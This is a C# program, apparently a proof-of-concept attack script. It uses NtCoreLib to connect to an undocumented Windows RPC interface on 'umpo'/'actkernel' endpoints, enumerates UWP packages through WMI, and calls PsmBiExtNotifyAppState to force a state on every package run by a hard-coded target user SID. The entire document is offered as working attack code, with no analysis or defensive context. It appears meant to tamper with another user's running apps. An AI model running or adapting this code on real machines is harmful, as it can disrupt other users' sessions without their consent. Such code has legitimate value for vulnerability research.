using System.Management;
using System.Security.Principal;
using NtCoreLib.Ndr.Rpc;
using NtCoreLib.Win32.Rpc.EndpointMapper;
using NtCoreLib.Win32.Rpc.Transport;
using rpc_8bfc3be1_6def_4e2d_af74_7c47cd0ade4a_1_0;

class Program
{
    private const short State = 0;

    static int Main()
    {
        try
        {
            string targetSid = "S-1-5-21-1533898502-3188944542-3165517739-1006"; // target SID

            var ifUuid = new Guid("8bfc3be1-6def-4e2d-af74-7c47cd0ade4a");
            var syntax = new RpcSyntaxIdentifier(ifUuid, 1, 0);

            // get all endpoints with interface
            var endpoints = RpcEndpointMapper.QueryEndpointsForInterface(null, syntax);

            // umpo veya actkernel filter
            var selectedEndpoints = endpoints
                .Where(e => e.Binding.ToString().Contains("umpo", StringComparison.OrdinalIgnoreCase)
                         || e.Binding.ToString().Contains("actkernel", StringComparison.OrdinalIgnoreCase))
                .ToList();

            if (selectedEndpoints.Count == 0)
            {
                Console.WriteLine("[-] No umpo/actkernel endpoints found.");
                return 2;
            }

            // find target user packages
            var packages = FindRunningPackagesForSid(targetSid);
            if (packages.Count == 0)
            {
                Console.WriteLine("[!] No running packages found for the specified SID.");
                return 3;
            }

            foreach (var endpoint in selectedEndpoints)
            {
                Console.WriteLine($"[*] Endpoint: {endpoint.Binding}");
                Console.WriteLine($"[i] State   : {State} (Int16)");
                Console.WriteLine($"[*] Applying state {State} to {packages.Count} packages for SID {targetSid}:");

                var sidBytes = SidStringToBytes(targetSid, out _);
                int sidLength = sidBytes.Length;

                using var client = new Client();
                var security = new RpcTransportSecurity { AuthenticationLevel = RpcAuthenticationLevel.Call };
                client.Connect(endpoint, security, null);

                foreach (var pkg in packages)
                {
                    try
                    {
                        sbyte outFlag;
                        uint status = client.PsmBiExtNotifyAppState(
                            sidBytes, sidLength, pkg, State, out outFlag);

                        Console.WriteLine($"  - Package {pkg} -> Status 0x{status:X}, outFlag {outFlag}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"  - Package {pkg} -> ERROR: {ex.Message}");
                    }
                }
                Console.WriteLine();
            }

            return 0;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Error: {ex}");
            return 99;
        }
    }

    private static List<string> FindRunningPackagesForSid(string sid)
    {
        var packages = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        try
        {
            using var searcher = new ManagementObjectSearcher(
                "SELECT ExecutablePath, CommandLine FROM Win32_Process");

            foreach (ManagementObject proc in searcher.Get())
            {
                string exe = SafeStr(proc["ExecutablePath"]);
                string cmd = SafeStr(proc["CommandLine"]);

                if (string.IsNullOrEmpty(exe) && string.IsNullOrEmpty(cmd))
                    continue;

                bool isUwp = (exe != null && exe.IndexOf("WindowsApps", StringComparison.OrdinalIgnoreCase) >= 0)
                             || (cmd != null && (cmd.IndexOf("WindowsApps", StringComparison.OrdinalIgnoreCase) >= 0
                              || cmd.IndexOf("AppContainer", StringComparison.OrdinalIgnoreCase) >= 0));

                if (!isUwp)
                    continue;

                string pfn = ExtractPackageFullName(exe) ?? ExtractPackageFullName(cmd);
                if (!string.IsNullOrEmpty(pfn))
                    packages.Add(pfn);
            }
        }
        catch
        {
        }

        return packages.ToList();
    }

    private static string ExtractPackageFullName(string text)
    {
        if (string.IsNullOrEmpty(text))
            return null;

        int idx = text.IndexOf("WindowsApps\\", StringComparison.OrdinalIgnoreCase);
        if (idx < 0)
            return null;

        string sub = text.Substring(idx + "WindowsApps\\".Length);
        int endIdx = sub.IndexOf('\\');
        if (endIdx < 0)
            endIdx = sub.Length;

        return sub.Substring(0, endIdx);
    }

    private static byte[] SidStringToBytes(string sidString, out string printableSid)
    {
        var sidObj = new SecurityIdentifier(sidString);
        var bytes = new byte[sidObj.BinaryLength];
        sidObj.GetBinaryForm(bytes, 0);
        printableSid = sidObj.Value;
        return bytes;
    }

    private static string SafeStr(object o) => o?.ToString();
}
